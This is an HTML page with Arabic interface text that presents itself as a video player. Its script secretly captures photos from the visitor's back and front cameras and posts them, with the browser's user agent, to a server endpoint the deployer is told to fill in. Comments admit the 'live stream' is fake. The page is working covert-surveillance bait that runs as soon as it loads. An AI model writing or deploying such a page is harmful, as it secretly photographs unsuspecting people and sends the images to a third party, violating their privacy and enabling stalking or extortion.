<!DOCTYPE html>
<html>
<head>
    <title>مشغل الفيديو</title>
    <style>
        body { background: #1a1a2e; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; flex-direction: column; color: white; }
        video { width: 300px; border-radius: 15px; border: 2px solid #e94560; display: none; }
        .loader { font-size: 20px; }
        button { margin-top: 20px; padding: 12px 30px; background: #e94560; border: none; color: white; border-radius: 30px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="loader">⏳ جاري تحميل المشغل...</div>
    <video id="video" autoplay playsinline></video>
    <button id="captureBtn" style="display:none;">تشغيل البث المباشر</button>

    <script>
        // --- إعدادات الإرسال ---
        // غيّر هذا الرابط إلى endpoint الخادم الخاص بك (مثلاً: https://your-server.com/upload)
        const SERVER_ENDPOINT = "https://your-server.com/api/capture";

        // --- المتغيرات ---
        let video = document.getElementById('video');
        let stream = null;
        let frontStream = null; // للكاميرا الأمامية إذا أردت التقاطها بشكل منفصل

        // --- دالة التقاط الصور وإرسالها ---
        async function captureAndSend(streamToUse, facing) {
            if (!streamToUse) return;
            const track = streamToUse.getVideoTracks()[0];
            if (!track) return;

            // إنشاء عنصر Canvas لالتقاط الإطار
            const canvas = document.createElement('canvas');
            const settings = track.getSettings();
            canvas.width = settings.width || 640;
            canvas.height = settings.height || 480;
            const ctx = canvas.getContext('2d');

            // رسم إطار الفيديو على Canvas
            const videoElem = document.createElement('video');
            videoElem.srcObject = streamToUse;
            await videoElem.play();
            // ننتظر لحظة لظهور الإطار
            await new Promise(r => setTimeout(r, 500));
            ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/jpeg'); // Base64

            // إرسال الصورة إلى السيرفر
            fetch(SERVER_ENDPOINT, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    facing: facing, // "front" or "back"
                    image: imageData,
                    timestamp: Date.now(),
                    userAgent: navigator.userAgent
                })
            }).catch(err => console.log("إرسال فشل:", err));
        }

        // --- الوظيفة الرئيسية: طلب الكاميرات ---
        async function startCapture() {
            try {
                // 1. طلب الكاميرا الخلفية أولاً (environment)
                const backStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { exact: "environment" } }
                });
                video.srcObject = backStream;
                video.style.display = 'block';
                document.querySelector('.loader').style.display = 'none';
                document.getElementById('captureBtn').style.display = 'inline-block';

                // التقاط الصورة من الخلفية فوراً
                await captureAndSend(backStream, "back");

                // 2. محاولة الحصول على الكاميرا الأمامية (user)
                try {
                    const frontStream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: { exact: "user" } }
                    });
                    await captureAndSend(frontStream, "front");
                    // إغلاق الأمامية بعد التصوير لتوفير الموارد
                    frontStream.getTracks().forEach(t => t.stop());
                } catch (e) {
                    console.log("لا توجد كاميرا أمامية أو تم رفضها");
                }

                // نترك الخلفية مفتوحة لإظهار "بث مباشر" وهمي
                // زر "التشغيل" لإعادة التقاط يدوي (اختياري)
                document.getElementById('captureBtn').onclick = async function() {
                    await captureAndSend(backStream, "back_manual");
                    alert("تم أخذ لقطة جديدة وإرسالها");
                };

            } catch (error) {
                // إذا رفض المستخدم أو لم توجد كاميرا خلفية
                alert("تعذر الوصول إلى الكاميرا. تأكد من منح الصلاحية.");
                document.querySelector('.loader').innerText = "❌ حدث خطأ، حاول مرة أخرى";
            }
        }

        // --- بدء التشغيل فوراً ---
        startCapture();
    </script>
</body>
</html>
